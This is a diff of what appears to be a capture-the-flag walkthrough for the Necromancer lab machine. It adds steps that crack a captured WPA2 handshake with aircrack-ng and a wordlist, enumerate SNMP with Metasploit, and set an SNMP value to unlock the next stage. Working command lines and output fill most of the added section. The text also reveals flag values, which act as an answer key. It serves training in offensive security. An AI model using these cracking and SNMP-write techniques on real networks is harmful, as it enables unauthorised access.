@@ -725,7 +725,7 @@ You walk closer, and notice a pile of mutilated bats lying on the cave floor.  A
 flag5{0766c36577af58e15545f099a3b15e60}
 ```
 
-Sending the string blackmagic string to the server on port 31337 reveals the next flag and unlocked the next challenge.
+Sending the string blackmagic string to the server on port 31337 reveals the next flag and unlocks the next challenge.
 The fifth flag is **flag5{0766c36577af58e15545f099a3b15e60}**
 
 <img src="{{site.url}}/assets/necromancer-3.png">
@@ -746,4 +746,406 @@ root@kali:~# tar xvf necromancer.tar
 necromancer.cap
 root@kali:~# file necromancer.cap 
 necromancer.cap: tcpdump capture file (little-endian) - version 2.4 (802.11, capture length 65535)
+```
+
+With the next challenge there is a link to a file named necromancer as well as a reference to UDP 161.
+If we port scan the necromancer system again we see that UDP 161 is open. Running snmpwalk against the necromancer machine with a few common community string does not return results.
+
+```
+root@kali:~# unicornscan -mU -I 192.168.56.101:a;unicornscan -mT -I 192.168.56.101:a
+UDP open 192.168.56.101:161  ttl 64
+UDP open	            snmp[  161]		from 192.168.56.101  ttl 64 
+root@kali:~# snmpwalk -v1 -c public 192.168.56.101
+Timeout: No Response from 192.168.56.101
+root@kali:~# snmpwalk -v2c -c public 192.168.56.101
+Timeout: No Response from 192.168.56.101
+root@kali:~# snmpwalk -v1 -c private 192.168.56.101
+Timeout: No Response from 192.168.56.101
+root@kali:~# snmpwalk -v1 -c private 192.168.56.101
+Timeout: No Response from 192.168.56.101
+```
+After using the file command a few times against the linked file and decompressing we find a packet capture.
+Loading the file into wireshark we see it's actually a packet capture of wireless traffic.
+
+<img src="{{site.url}}/assets/necromancer-4.png">
+
+To make analysis easier I proceeded to use airodump to load the packet capture.
+
+```
+root@kali:~# airodump-ng -r necromancer.cap 
+ CH  0 ][ Elapsed: 0 s ][ 2016-09-19 07:09 ][ Finished reading input file necromancer.cap.
+
+
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+
+ C4:12:F5:0D:5E:95    0        1        5    0  11  54e. WPA2 CCMP   PSK  community
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe
+
+ C4:12:F5:0D:5E:95  E8:50:8B:20:52:75    0    0e- 0e   326      396
+```
+
+Looking at the output from airodump we can see one client connected to a wireless network protected by WPA2.
+The solution to this challenge is likely we have to recover the WPA password which will be the SNMP community string.
+
+```
+root@kali:~# gunzip -d /usr/share/wordlists/rockyou.txt.gz 
+root@kali:~# aircrack-ng -w /usr/share/wordlists/rockyou.txt necromancer.cap 
+Opening necromancer.cap
+Read 2197 packets.
+
+   #  BSSID              ESSID                     Encryption
+
+   1  C4:12:F5:0D:5E:95  community                 WPA (1 handshake)
+
+Choosing first network as target.
+
+Opening necromancer.cap
+Reading packets, please wait...
+                                 Aircrack-ng 1.2 rc2
+
+
+                   [00:00:14] 16100 keys tested (1149.34 k/s)
+
+
+                           KEY FOUND! [ death2all ]
+
+
+      Master Key     : 7C F8 5B 00 BC B6 AB ED B0 53 F9 94 2D 4D B7 AC 
+                       DB FA 53 6F A9 ED D5 68 79 91 84 7B 7E 6E 0F E7 
+
+      Transient Key  : EB 8E 29 CE 8F 13 71 29 AF FF 04 D7 98 4C 32 3C 
+                       56 8E 6D 41 55 DD B7 E4 3C 65 9A 18 0B BE A3 B3 
+                       C8 9D 7F EE 13 2D 94 3C 3F B7 27 6B 06 53 EB 92 
+                       3B 10 A5 B0 FD 1B 10 D4 24 3C B9 D6 AC 23 D5 7D 
+
+      EAPOL HMAC     : F6 E5 E2 12 67 F7 1D DC 08 2B 17 9C 72 42 71 8E 
+```
+
+If we use WPA password as the SNMP community string we get a response from the SNMP server as well as a new SNMP community string.
+Running snmpwalk with the new community string it reveals more information about the necromancer machine.
+
+```
+root@kali:~# snmpwalk -v1 -c death2all 192.168.56.101
+iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
+iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
+iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
+iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
+End of MIB
+root@kali:~# snmpwalk -v2c -c death2all 192.168.56.101
+iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
+iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
+iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
+iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
+iso.3.6.1.2.1.1.6.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
+root@kali:~# snmpwalk -v2c -c death2allrw 192.168.56.101
+iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.255
+iso.3.6.1.2.1.1.3.0 = Timeticks: (531103) 1:28:31.03
+iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
+iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
+iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
+```
+
+I proceeded to use metasploit's snmp enumeration module to pull as much information as I can.
+
+```
+msf > use auxiliary/scanner/snmp/snmp_enum
+msf auxiliary(snmp_enum) > show options 
+
+Module options (auxiliary/scanner/snmp/snmp_enum):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   COMMUNITY  public           yes       SNMP Community String
+   RETRIES    1                yes       SNMP Retries
+   RHOSTS                      yes       The target address range or CIDR identifier
+   RPORT      161              yes       The target port
+   THREADS    1                yes       The number of concurrent threads
+   TIMEOUT    1                yes       SNMP Timeout
+   VERSION    1                yes       SNMP Version <1/2c>
+
+msf auxiliary(snmp_enum) > set -g COMMUNITY death2allrw
+COMMUNITY => death2allrw
+msf auxiliary(snmp_enum) > set rhosts 192.168.56.101
+rhosts => 192.168.56.101
+msf auxiliary(snmp_enum) > run 
+
+[+] 192.168.56.101, Connected.
+
+[*] System information:
+
+Host IP                       : 192.168.56.101
+Hostname                      : Fear the Necromancer!
+Description                   : You stand in front of a door.
+Contact                       : The door is Locked. If you choose to defeat me, the door must be Unlocked.
+Location                      : Locked - death2allrw!
+Uptime snmp                   : 01:38:26.80
+Uptime system                 : 01:38:19.57
+System date                   : 2016-9-20 08:04:14.0
+
+[*] Network information:
+
+IP forwarding enabled         : no
+Default TTL                   : 64
+TCP segments received         : 280
+TCP segments sent             : 632
+TCP segments retrans          : 0
+Input datagrams               : 517035
+Delivered datagrams           : 381642
+Output datagrams              : 381973
+
+[*] Network interfaces:
+
+Interface                     : [ up ] em0
+Id                            : 1
+Mac Address                   : 00:00:27:3c:17:95
+Type                          : ethernet-csmacd
+Speed                         : 1000 Mbps
+MTU                           : 1500
+In octets                     : 10552409
+Out octets                    : 871602
+
+Interface                     : [ down ] enc0
+Id                            : 2
+Mac Address                   : :::::
+Type                          : unknown
+Speed                         : 0 Mbps
+MTU                           : 0
+In octets                     : 0
+Out octets                    : 0
+
+Interface                     : [ up ] lo0
+Id                            : 3
+Mac Address                   : :::::
+Type                          : softwareLoopback
+Speed                         : 0 Mbps
+MTU                           : 32768
+In octets                     : 32529220
+Out octets                    : 32529220
+
+Interface                     : [ up ] pflog0
+Id                            : 4
+Mac Address                   : :::::
+Type                          : unknown
+Speed                         : 0 Mbps
+MTU                           : 33144
+In octets                     : 0
+Out octets                    : 46
+
+
+[*] Network IP:
+
+Id                  IP Address          Netmask             Broadcast           
+3                   127.0.0.1           255.0.0.0           0                   
+1                   192.168.56.101      255.255.255.0       1                   
+
+[*] Routing information:
+
+Destination         Next hop            Mask                Metric              
+0.0.0.0             192.168.56.1        0.0.0.0             1                   
+127.0.0.0           127.0.0.1           255.0.0.0           1                   
+127.0.0.1           127.0.0.1           255.255.255.255     0                   
+192.168.56.0        192.168.56.101      255.255.255.0       0                   
+224.0.0.0           127.0.0.1           240.0.0.0           0                   
+
+[*] TCP connections and listening ports:
+
+Local address       Local port          Remote address      Remote port         State               
+0.0.0.0             199                 0.0.0.0             0                   listen              
+
+[*] Listening UDP ports:
+
+Local address       Local port          
+0.0.0.0             514                 
+127.0.0.1           161                 
+127.0.0.1           666                 
+127.0.0.1           31337               
+192.168.56.101       4615                
+192.168.56.101       8114                
+192.168.56.101       9694                
+192.168.56.101       41155               
+
+[*] Storage information:
+
+Description                   : ["Physical memory"]
+Device id                     : [#<SNMP::Integer:0xf5dd7fc @value=1>]
+Filesystem type               : ["Ram"]
+Device unit                   : [#<SNMP::Integer:0xf5cfb5c @value=4096>]
+Memory size                   : 495.94 MB
+Memory used                   : 88.94 MB
+
+Description                   : ["Real memory"]
+Device id                     : [#<SNMP::Integer:0xf5cc0d8 @value=2>]
+Filesystem type               : ["Ram"]
+Device unit                   : [#<SNMP::Integer:0xf5c6b10 @value=4096>]
+Memory size                   : 495.93 MB
+Memory used                   : 88.93 MB
+
+Description                   : ["Virtual memory"]
+Device id                     : [#<SNMP::Integer:0xf5b7700 @value=3>]
+Filesystem type               : ["Virtual Memory"]
+Device unit                   : [#<SNMP::Integer:0xf5b6648 @value=4096>]
+Memory size                   : 78.09 MB
+Memory used                   : 57.14 MB
+
+Description                   : ["Shared virtual memory"]
+Device id                     : [#<SNMP::Integer:0xf5a9e98 @value=8>]
+Filesystem type               : ["Other"]
+Device unit                   : [#<SNMP::Integer:0xf5a878c @value=4096>]
+Memory size                   : 0 bytes
+Memory used                   : 0 bytes
+
+Description                   : ["Shared real memory"]
+Device id                     : [#<SNMP::Integer:0xf5a0fa0 @value=9>]
+Filesystem type               : ["Other"]
+Device unit                   : [#<SNMP::Integer:0xf59fd44 @value=4096>]
+Memory size                   : 0 bytes
+Memory used                   : 0 bytes
+
+Description                   : ["Swap space"]
+Device id                     : [#<SNMP::Integer:0xf59c658 @value=10>]
+Filesystem type               : ["Virtual Memory"]
+Device unit                   : [#<SNMP::Integer:0xf587140 @value=4096>]
+Memory size                   : 81.14 MB
+Memory used                   : 0 bytes
+
+Description                   : ["/"]
+Device id                     : [#<SNMP::Integer:0xf57f2ec @value=31>]
+Filesystem type               : ["Fixed Disk"]
+Device unit                   : [#<SNMP::Integer:0xf57de4c @value=2048>]
+Memory size                   : 787.86 MB
+Memory used                   : 49.53 MB
+
+Description                   : ["/home"]
+Device id                     : [#<SNMP::Integer:0xf5723bc @value=32>]
+Filesystem type               : ["Fixed Disk"]
+Device unit                   : [#<SNMP::Integer:0xf570d00 @value=2048>]
+Memory size                   : 251.65 MB
+Memory used                   : 20.00 KB
+
+Description                   : ["/usr"]
+Device id                     : [#<SNMP::Integer:0xf561288 @value=33>]
+Filesystem type               : ["Fixed Disk"]
+Device unit                   : [#<SNMP::Integer:0xf55bd60 @value=2048>]
+Memory size                   : 892.86 MB
+Memory used                   : 694.72 MB
+
+
+[*] File system information:
+
+Index                         : 1
+Mount point                   : /
+Remote mount point            : -
+Type                          : BerkeleyFFS
+Access                        : 1
+Bootable                      : 1
+
+[*] Device information:
+
+Id                  Type                Status              Descr               
+196608              Processor           running             <censored>
+262145              Network             running             network interface em0
+262146              Network             down                network interface enc0
+262147              Network             running             network interface lo0
+262148              Network             running             network interface pflog0
+393216              Disk Storage        unknown             ESDI                
+786432              Coprocessor         unknown             Guessing that there's a floating point co-processor
+
+[*] Software components:
+
+Index               Name                
+1                   bzip2-1.0.6p7       
+2                   libiconv-1.14p3     
+3                   gettext-0.19.7      
+4                   libffi-3.2.1p0      
+5                   python-2.7.11       
+6                   pcre-8.38           
+7                   libunistring-0.9.6  
+8                   libidn-1.32         
+9                   libpsl-0.7.1p1      
+10                  wget-1.16.3p0       
+11                  quirks-2.231        
+12                  femail-1.0p1        
+13                  femail-chroot-1.0p2 
+14                  xz-5.2.2p0          
+15                  libxml-2.9.3        
+16                  php-5.4.45p2        
+17                  net-snmp-5.7.3p6    
+18                  sudo-1.8.15         
+
+[*] Processes:
+
+Id                  Status              Name                Path                Parameters          
+0                   runnable            swapper             swapper                                 
+1                   runnable            init                /sbin/init                              
+899                 runnable            sh                  sh                  -c /bin/sh /root/scripts/flag5.sh
+1712                runnable            dhclient            dhclient: em0                           
+1777                runnable            cleaner             cleaner                                 
+2831                runnable            ntpd                ntpd: dns engine                        
+3267                runnable            grep                /usr/bin/grep       -i unlocked         
+4001                runnable            systq               systq                                   
+4606                runnable            getty               /usr/libexec/getty  std.9600 ttyC2      
+4834                runnable            softnet             softnet                                 
+5826                runnable            ntpd                /usr/sbin/ntpd                          
+5844                runnable            httpd               /usr/sbin/httpd                         
+5873                runnable            sh                  /bin/sh             /root/scripts/flag6.sh
+6652                runnable            crypto              crypto                                  
+6808                runnable            sndiod              /usr/bin/sndiod                         
+7714                runnable            syslogd             /usr/sbin/syslogd                       
+8623                runnable            acpi0               acpi0                                   
+8922                runnable            httpd               httpd: logger                           
+9487                runnable            idle0               idle0                                   
+10107               runnable            cron                /usr/sbin/cron                          
+10314               runnable            httpd               httpd: server                           
+10350               runnable            aiodoned            aiodoned                                
+10691               runnable            dhclient            dhclient: em0 [priv]                    
+11086               runnable            httpd               httpd: server                           
+13265               runnable            sh                  /bin/sh             /root/scripts/flag5.sh
+14197               runnable            usbtask             usbtask                                 
+14414               runnable            getty               /usr/libexec/getty  std.9600 ttyC3      
+15288               runnable            sndiod              sndiod: helper                          
+15996               runnable            httpd               httpd: server                           
+16246               runnable            pflogd              pflogd: [priv]                          
+17529               runnable            syslogd             syslogd: [priv]                         
+18963               runnable            reaper              reaper                                  
+19490               running             snmpd               /usr/local/sbin/snmpd-u root -I -ipv6    
+21317               runnable            sshd                /usr/sbin/sshd                          
+22278               runnable            update              update                                  
+22406               running             snmpget             /usr/local/bin/snmpget-v 2c -c  127.0.0.1 .1.3.6.1.2.1.1.6.0
+22825               runnable            pflogd              pflogd: [running] -s 160 -i pflog0 -f /var/log/pflog                    
+23764               runnable            getty               /usr/libexec/getty  std.9600 ttyC0      
+24614               running             zerothread          zerothread                              
+24829               runnable            pagedaemon          pagedaemon                              
+24867               runnable            getty               /usr/libexec/getty  std.9600 ttyC1      
+25555               runnable            ntpd                ntpd: ntp engine                        
+26027               runnable            usbatsk             usbatsk                                 
+27791               runnable            pfpurge             pfpurge                                 
+29661               runnable            systqmp             systqmp                                 
+30250               runnable            getty               /usr/libexec/getty  std.9600 ttyC5      
+
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+Looking at the process listing output, there appears to be a script which is checking the SNMP OID .1.3.6.1.2.1.1.6.0.
+Combined with the response which mentioned we need to unlock the door, It appears we need to set the SNMP OID .1.3.6.1.2.1.1.6.0. to "Unlocked"
+
+```
+root@kali:~# snmpget -v2c -c death2allrw 192.168.56.101 .1.3.6.1.2.1.1.6.0
+iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
+root@kali:~# snmpset -v2c -c death2allrw 192.168.56.101 .1.3.6.1.2.1.1.6.0 s Unlocked
+iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked"
+root@kali:~# snmpget -v2c -c death2allrw 192.168.56.101 .1.3.6.1.2.1.1.6.0
+iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"
+```
+
+The seventh flag is **flag7{9e5494108d10bbd5f9e7ae52239546c4}**. The plaintext for 9e5494108d10bbd5f9e7ae52239546c4 is demonslayer.
+After setting the SNMP OID, the SNMP and HTTP ports are closed but now SSH is now open
+
+```
+root@kali:~# unicornscan -mU -I 192.168.56.101:a;unicornscan -mT -I 192.168.56.101:a
+TCP open 192.168.56.101:22  ttl 64
+TCP open	             ssh[   22]		from 192.168.56.101  ttl 64 
 ```
